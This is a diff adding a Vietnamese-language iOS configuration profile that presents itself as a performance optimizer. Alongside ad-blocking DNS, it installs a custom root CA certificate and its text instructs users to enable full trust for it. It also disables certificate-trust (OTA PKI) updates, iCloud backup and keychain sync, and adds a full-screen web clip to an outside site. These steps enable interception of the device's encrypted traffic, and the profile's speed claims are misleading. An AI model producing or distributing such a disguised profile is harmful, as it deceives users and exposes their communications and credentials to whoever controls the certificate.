@@ -1,0 +1,182 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadDisplayName</key>
+    <string>iOS Performance Optimizer</string>
+    <key>PayloadDescription</key>
+    <string>Tối ưu hiệu năng phần mềm iOS — 20+ restriction tắt tiến trình nền, DNS chặn QC, Root CA dự phòng.</string>
+    <key>PayloadIdentifier</key>
+    <string>com.performance.ios</string>
+    <key>PayloadOrganization</key>
+    <string>iOS Performance Lab</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>a1b2c3d4-e5f6-7890-abcd-ef1234567800</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+    <key>PayloadContent</key>
+    <array>
+
+        <!-- ============================================ -->
+        <!-- PAYLOAD 1: DNS over HTTPS (AdGuard)          -->
+        <!-- ============================================ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>DNS Chặn quảng cáo</string>
+            <key>PayloadDescription</key>
+            <string>Chặn quảng cáo, tracker, malware ở cấp DNS. DoH mã hóa.</string>
+            <key>PayloadIdentifier</key>
+            <string>com.performance.ios.dns</string>
+            <key>PayloadType</key>
+            <string>com.apple.dnsSettings.managed</string>
+            <key>PayloadUUID</key>
+            <string>a1b2c3d4-e5f6-7890-abcd-ef1234567801</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>DNSSettings</key>
+            <dict>
+                <key>DNSProtocol</key>
+                <string>HTTPS</string>
+                <key>ServerAddresses</key>
+                <array>
+                    <string>94.140.14.14</string>
+                    <string>94.140.15.15</string>
+                    <string>2a10:50c0::ad1:ff</string>
+                    <string>2a10:50c0::ad2:ff</string>
+                </array>
+                <key>ServerURL</key>
+                <string>https://dns.adguard.com/dns-query</string>
+            </dict>
+        </dict>
+
+        <!-- ============================================ -->
+        <!-- PAYLOAD 2: System Restrictions (20+ items)   -->
+        <!-- ============================================ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>Kiểm soát hiệu năng phần mềm</string>
+            <key>PayloadDescription</key>
+            <string>Tắt 20+ tiến trình nền — giảm CPU, RAM, nhiệt, hao pin. Tăng tốc máy toàn diện.</string>
+            <key>PayloadIdentifier</key>
+            <string>com.performance.ios.restrictions</string>
+            <key>PayloadType</key>
+            <string>com.apple.applicationaccess</string>
+            <key>PayloadUUID</key>
+            <string>a1b2c3d4-e5f6-7890-abcd-ef1234567802</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>Restrictions</key>
+            <dict>
+                <!-- ==== DAEMON NỀN (Background Daemons) ==== -->
+                <key>allowDiagnosticSubmission</key>
+                <false/>
+                <key>allowAutomaticAppDownloads</key>
+                <false/>
+
+                <!-- ==== iCLOUD SYNC (tắt từng dịch vụ) ==== -->
+                <key>allowCloudDocumentSync</key>
+                <false/>
+                <key>allowCloudBackup</key>
+                <false/>
+                <key>allowCloudKeychainSync</key>
+                <false/>
+                <key>allowCloudAddressBookSync</key>
+                <false/>
+                <key>allowCloudCalendarSync</key>
+                <false/>
+                <key>allowCloudRemindersSync</key>
+                <false/>
+                <key>allowCloudBookmarksSync</key>
+                <false/>
+                <key>allowCloudNotesSync</key>
+                <false/>
+
+                <!-- ==== SIRI & SPOTLIGHT (ML nền) ==== -->
+                <key>allowAssistant</key>
+                <false/>
+                <key>allowSpotlightSuggestions</key>
+                <false/>
+
+                <!-- ==== SYSTEM SERVICES ==== -->
+                <key>allowOTAPKIUpdates</key>
+                <false/>
+                <key>allowGlobalBackgroundFetchWhenRoaming</key>
+                <false/>
+                <key>allowAutoUnlock</key>
+                <false/>
+                <key>allowAirDrop</key>
+                <false/>
+                <key>allowAutoSync</key>
+                <false/>
+
+                <!-- ==== PRIVACY ==== -->
+                <key>allowAppStoreAppAdTracking</key>
+                <false/>
+
+                <!-- ==== GIỮ NGUYÊN (không ảnh hưởng hiệu năng) ==== -->
+                <key>allowAppInstallation</key>
+                <true/>
+                <key>allowScreenShot</key>
+                <true/>
+                <key>allowBluetoothModification</key>
+                <true/>
+            </dict>
+        </dict>
+
+        <!-- ============================================ -->
+        <!-- PAYLOAD 3: Root CA Certificate               -->
+        <!-- ============================================ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>iOS Performance Root CA</string>
+            <key>PayloadDescription</key>
+            <string>Chứng chỉ gốc cho hệ thống. Vào Cài đặt > Cài đặt chung > Giới thiệu > Tin cậy chứng nhận > BẬT. Dự phòng cho nâng cấp sau.</string>
+            <key>PayloadIdentifier</key>
+            <string>com.performance.ios.cert</string>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadUUID</key>
+            <string>a1b2c3d4-e5f6-7890-abcd-ef1234567804</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadContent</key>
+            <data>
+MIIDhTCCAm2gAwIBAgIQHkDRpoBeiI1HreNglyFfhjANBgkqhkiG9w0BAQsFADBNMQswCQYDVQQGEwJWTjEcMBoGA1UECgwTaU9TIFBlcmZvcm1hbmNlIExhYjEgMB4GA1UEAwwXaU9TIFBlcmZvcm1hbmNlIFJvb3QgQ0EwHhcNMjYwNzA4MDIyMTQ5WhcNMzYwNzA4MDIzMTQ3WjBNMQswCQYDVQQGEwJWTjEcMBoGA1UECgwTaU9TIFBlcmZvcm1hbmNlIExhYjEgMB4GA1UEAwwXaU9TIFBlcmZvcm1hbmNlIFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZw8FhG/Uf+Y7Ny6SoozmhdGrntdOZSkkdtQjveeqZjA8h4Yg89HCFxyt66/fSxrfSrtEu0u1NcciafRS6OyvM2lqxlx77tCqfktO3eTvSdz/8CObyjmDgaALziTwocDI6uIZF/lKe4hYw8dHYnuAYMc+NkTosBCS1YApRPRFBOsHvNki+cMnzYqr0UX+55QxD1mVx9yGDGMz0F9Pvxftt4nITdWH9UDKpPWU0wQ0ekP/JffRoawJjeZTovO29Vhs11UDRfz2XASTmiEmqi8OTLZAD6ONBn51/ZFMq/t74Hw4bfAYcKDPkkTbElAlMqvGaKjUwIrnccoyR8PaG0CmtAgMBAAGjYTBfMA4GA1UdDwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUxq9r3GNa09CcdPESywp9trvr184wDQYJKoZIhvcNAQELBQADggEBABV9iCy8Gm8tikdZ2PWn1uxXabvn+GtfcZnV9Codq0BxCDR7/VosWbH1bd9WAvg/nQQcdXOG1XuxKBprcGdR3Cvbm0ktqtQF9E0+7sSznazJzcim+zmx2Q3zQlSSgyP5dvjF6RIm5BBLb/Q4lTUZUjvedQh1y4v4a6MAS/xss2Eo6NHQXzigRBJevaoxTwobOzn7gVbNIQQfEoKE13zG/xZpbcP+QDjg7If0M6bVg1x8LC5F3UA8ZL7V30iduf6dp3tpzNbneJ1nsTE+ymOYNm2cz54xlQ/l34ysqrykWYulhEx8uoaj8R1dh8PIevetjHIHUVh78NCGlbMNlxrswVU=
+            </data>
+        </dict>
+
+        <!-- ============================================ -->
+        <!-- PAYLOAD 4: WebClip Dashboard                 -->
+        <!-- ============================================ -->
+        <dict>
+            <key>PayloadDisplayName</key>
+            <string>Bảng điều khiển Hiệu năng</string>
+            <key>PayloadDescription</key>
+            <string>Dashboard — thông số thực, kiểm tra profile.</string>
+            <key>PayloadIdentifier</key>
+            <string>com.performance.ios.webclip</string>
+            <key>PayloadType</key>
+            <string>com.apple.webClip.managed</string>
+            <key>PayloadUUID</key>
+            <string>a1b2c3d4-e5f6-7890-abcd-ef1234567803</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>FullScreen</key>
+            <true/>
+            <key>IsRemovable</key>
+            <true/>
+            <key>Label</key>
+            <string>⚡Perf</string>
+            <key>Precomposed</key>
+            <false/>
+            <key>URL</key>
+            <string>https://makingshop156-web.github.io/T-i-u/</string>
+        </dict>
+
+    </array>
+</dict>
+</plist>
